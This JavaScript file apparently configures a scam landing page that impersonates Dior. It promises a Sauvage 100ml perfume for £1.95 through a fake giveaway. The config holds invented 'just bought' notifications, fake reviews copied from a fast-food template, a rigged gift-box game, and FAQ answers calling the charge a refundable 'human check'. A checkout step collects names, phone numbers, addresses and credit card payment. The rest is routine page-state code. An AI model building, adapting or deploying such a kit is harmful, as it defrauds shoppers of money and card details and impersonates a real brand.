const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

(function (exp) {
  const countryCode = "gb";
  const lang = "en-GB";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "Size: ",
    arr: [
      "XS",
      "S",
      "M",
      "M/L",
      "L",
      "L/XL",
      "XL",
      "XXL"
    ]
  };

  // I FILL THIS INFO IN MAIN.JS 
  const mainProduct = {
    header: "",
    name: "Congratulations! You can join the Dior Sauvage 100ml promotion!",
    oldPrice: "",
    newPrice: "",
    selectText: "",
    text: "Dior is selling off its remaining Sauvage perfumes for just £1.95 after ceasing operations in Eastern Europe. Thanks to the new campaign strategy, everyone in the United Kingdom can get 1 of 1000 perfumes today🎁. <br><br> To receive a Sauvage from Dior, please fill out the form to confirm you are a real person. <br><br> Please hurry as the number of items on offer is limited!",
  };

  const notifications = [
    {
      user: "Odelia Ben***",
      location: "London, United Kingdom",
      action: "Just managed to buy Dior Sauvage 100ml for £1.95!",
      timeago: "15 seconds ago",
    },
    {
      user: "Tracey B***",
      location: "Birmingham, United Kingdom",
      action: "Just managed to buy Dior Sauvage 100ml for £1.95!",
      timeago: "25 seconds ago",
    },
  ];

  const reviewsArr = [
    {
      name: "Luis",
      time: "1 day ago",
      header: "This is amazing!",
      product: "26468782",
      review:
        "As a long-time customer, I was really surprised to get my favorite menu at such a low price 😊.",
    },
    {
      name: "Antonio",
      time: "2 days ago",
      header: "Fantastic! I'm speechless.",
      product: "26468789",
      review:
        "First time participating in such promotions and I got the menu, thank you.",
    },
    {
      name: "Josef",
      time: "2 days ago",
      header: "Simply great.",
      product: "26468783",
      review:
        "It was delicious, enough for the whole family and even had some leftovers.",
    },
    {
      name: "Miguel",
      time: "4 days ago",
      header: "I love it.",
      review:
        "Honestly, I love fast food, and this promotion was just for me.",
    },
    {
      name: "Juan",
      time: "7 days ago",
      header: "Wow, I am absolutely delighted with this product!",
      product: "26468784",
      review:
        "It must be a joke! At first, I thought it was a scam because of the price, but luckily I didn't pass up the offer and ordered it, thank you.",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "NOTES AND REVIEWS",
    percent: "99%",
    rec: "comments on this action",
  };

  const questions = {
    _of: "Question {1} of {2}: ",
    arr: [
      {
        q: "Have you ever worn Dior Sauvage before?",
        a: [
          "Yes",
          "No"
        ],

      },
      {
        q: "Where did you find this sentence?",
        a: [
          "On the official website",
          "Facebook adverts",
          "Forwarded a friend"
        ],
      },
      {
        q: "For what purpose you will use a Dior Sauvage?",
        a: ["For a gift", "For personal use"],
      },
    ],
  };

  const check = {
    title: "Your answers are being verified.",
    arr: [
      "You have answered question 3/3",
      "There are no preliminary studies of your IP.",
      "Gifts are loading...",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header:
          "Congratulations, you have confirmed that you are a real person.",
        button: "OK",
        text: `
      <center>
      Today, {date}, you have a chance to get your Dior Sauvage 100ml.
        <br><br>
        All you have to do is choose the right gift box.
        <br><br>
        You have 3 guesses, good luck!
      </center>
    `,
      },
    },
    first: {
      texts: {
        header: "Oh no...",
        button: "OK",
        text: `
      <center>
      Sorry, but this gift is empty! You have 2 more attempts. Good luck!
      </center>
    `,
      },
    },
    win: {
      texts: {
        header: `Congratulations! You win!`,
        button: "OK",
        text: `
      <center>
        <p style="color: #b51817">
        You've won the Dior Sauvage 100ml!
        </p>
        <br>
        1) Click "OK" below to go to the shipping payment page.
         <br><br>
        2) Fill in the form and pay for your order to receive your Dior Sauvage.
        <br><br>
        3) The package will be delivered within 5-7 days.
      </center>
    `,
      },
    },
  };

  const faqs = [
    {
      question: "How long will I wait for my prize?",
      answer: "It usually takes 5-7 working days."
    },
    {
      question: "Are there any hidden costs?",
      answer: "Absolutely not. Once you have won your prize and entered your details, we will take care of the rest. Shipping costs are our responsibility!"
    },
    {
      question: "I'm a winner, why should I answer the questions/guess the box?",
      answer: "You're not a winner yet, but you were one of the 10 people selected to try to win our prize..."
    },
    {
      question: "How can I get a prize if I win?",
      answer: "First, you need to enter your shipping address and contact details, then our system will direct you. Then you have to prove that you are not a robot, as the prize is only offered to real people."
    },
    {
      question: "Why should I pay £1.95 for a prize?",
      answer: "£1.95 is not a price - it is an upfront payment to prove that you are indeed human. All payments will be refunded once approved."
    },
    {
      question: "Can't use my credit card, transaction failed?",
      answer: "If you can't use your credit card, your bank is blocking the transaction: you need to check your bank account."
    },
  ];

  const cartSteps = {
    personal: {
      title: "Personal Information",
      fields: {
        name: {
          enabled: true,
          field: "First Name",
        },
        family: {
          enabled: true,
          field: "Last Name",
        },
        phone: {
          enabled: true,
          field: "Phone Number",
        },
        email: {
          enabled: true,
          field: "Email",
        },
      },
    },
    delivery: {
      title: "Delivery",
      fields: {
        city: {
          enabled: true,
          field: "City",
        },
        address: {
          enabled: true,
          field: "Delivery Address",
        },
        zip: {
          enabled: true,
          field: "Postal Code",
        },
      },
    },
    payment: {
      title: "Payment Methods",
      creditCard: "Online payment by credit card",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Order Summary",
      oldPrice: "",
      newPrice: "£1.95",
      size: "Size",
      subTotal: {
        title: "Order Value",
        amount: "£1.95",
      },
      delivery: {
        title: "Delivery",
        amount: "£0.00",
      },
      total: {
        title: "Total",
        amount: "£1.95",
      },
      checkoutButton: "Pay your order",
    },
  };

  const products = [
    {
      id: "26468782",
      name: "Dior Sauvage 100ml",
      miniImg: "./assets/slide_1.png",

      images: [
        "./assets/slide_1.png",
        "./assets/slide_2.png",
        "./assets/slide_3.png",
        "./assets/slide_4.png",
      ],
    }
  ];

  const footer = {
    cr: "© 2024 DIOR. All rights reserved.",
  };


  const pathImgBox = {
    lid: "./assets/box-lid.png",
    lidIOs: "./assets/box-lid-ios.png",
    inner: "./assets/box-inner.png",
    innerGift: "./assets/box-inner-gift.png",
    box: "./assets/box.png",
    boxModal: "./assets/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
    faqs,
  };
})(window);

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  localStorage.setItem("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");

  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }

  return products.find((pr) => pr.id === ind);
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) =>
  localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader_container");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {

  const loader = document.querySelector(".loader_container");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");

};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};
